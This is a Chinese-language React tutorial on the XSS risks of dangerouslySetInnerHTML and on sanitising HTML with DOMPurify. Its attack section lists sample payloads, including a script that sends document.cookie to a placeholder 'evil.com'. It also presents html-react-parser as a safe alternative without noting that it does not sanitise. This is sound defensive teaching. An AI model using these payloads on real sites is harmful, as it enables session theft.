---
title: dangerouslySetInnerHTML 有什么风险？
category: React
difficulty: 中级
updatedAt: 2025-12-09
summary: >-
  理解 dangerouslySetInnerHTML 的安全风险和正确使用方式。
tags:
  - React
  - XSS
  - 安全
  - dangerouslySetInnerHTML
estimatedTime: 10 分钟
keywords:
  - dangerouslySetInnerHTML
  - XSS risk
  - HTML injection
  - security
highlight: dangerouslySetInnerHTML 绕过 React 的转义机制，可能导致 XSS 攻击，必须对内容进行消毒。
order: 649
---

## 问题 1：什么是 dangerouslySetInnerHTML？

### 基本用法

```jsx
function RichContent({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// 使用
<RichContent html="<strong>Bold</strong> text" />;
```

### 为什么叫 "dangerously"？

```jsx
// React 故意用这个名字警告开发者
// 它绕过了 React 的自动转义
// 直接将 HTML 插入 DOM

// 正常 JSX：自动转义
<div>{userInput}</div>  // 安全

// dangerouslySetInnerHTML：不转义
<div dangerouslySetInnerHTML={{ __html: userInput }} />  // 危险！
```

---

## 问题 2：XSS 攻击风险

### 攻击示例

```jsx
// 用户输入恶意内容
const userInput = '<img src="x" onerror="alert(document.cookie)">';

// 直接使用 dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{ __html: userInput }} />;

// 结果：用户的 cookie 被盗取
```

### 更多攻击向量

```jsx
// 脚本注入
'<script>fetch("evil.com?cookie="+document.cookie)</script>';

// 事件处理
'<div onmouseover="alert(1)">Hover me</div>';

// 链接劫持
'<a href="javascript:alert(1)">Click</a>';

// iframe 注入
'<iframe src="evil.com"></iframe>';
```

---

## 问题 3：正确使用方式

### 使用 DOMPurify 消毒

```jsx
import DOMPurify from "dompurify";

function SafeHTML({ html }) {
  // 消毒 HTML，移除危险内容
  const cleanHTML = DOMPurify.sanitize(html);

  return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
}

// 恶意内容会被移除
// '<script>alert(1)</script>' → ''
// '<img onerror="alert(1)">' → '<img>'
```

### 配置白名单

```jsx
const cleanHTML = DOMPurify.sanitize(html, {
  // 只允许这些标签
  ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "br"],

  // 只允许这些属性
  ALLOWED_ATTR: ["href", "title", "target"],

  // 禁止 javascript: 协议
  ALLOW_UNKNOWN_PROTOCOLS: false,
});
```

---

## 问题 4：适用场景

### 适合使用的场景

```jsx
// 1. 富文本编辑器内容
// 来自可信的富文本编辑器，经过消毒

// 2. Markdown 渲染
// 将 Markdown 转换为 HTML 后显示
import { marked } from "marked";
import DOMPurify from "dompurify";

function Markdown({ content }) {
  const html = marked(content);
  const cleanHTML = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
}

// 3. 服务端渲染的可信内容
// 来自自己服务器的 HTML
```

### 不适合使用的场景

```jsx
// 1. 用户评论
// 用户可以输入任意内容

// 2. URL 参数
// 攻击者可以构造恶意 URL

// 3. 任何未经验证的外部数据
```

---

## 问题 5：替代方案

### 使用 React 组件

```jsx
// 不使用 dangerouslySetInnerHTML
// 而是解析 HTML 并渲染为 React 组件

import parse from "html-react-parser";

function SafeContent({ html }) {
  // html-react-parser 会将 HTML 转换为 React 元素
  return <div>{parse(html)}</div>;
}
```

### 使用专门的库

```jsx
// react-markdown：渲染 Markdown
import ReactMarkdown from "react-markdown";

function MarkdownContent({ content }) {
  return <ReactMarkdown>{content}</ReactMarkdown>;
}

// 不需要 dangerouslySetInnerHTML
// 库内部处理安全问题
```

## 总结

| 方面   | 说明                              |
| ------ | --------------------------------- |
| 风险   | XSS 攻击、数据泄露                |
| 必须   | 使用 DOMPurify 消毒               |
| 白名单 | 限制允许的标签和属性              |
| 替代   | html-react-parser、react-markdown |

**原则**：永远不要直接使用未经消毒的用户输入。

## 延伸阅读

- [DOMPurify](https://github.com/cure53/DOMPurify)
- [React 安全](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html)
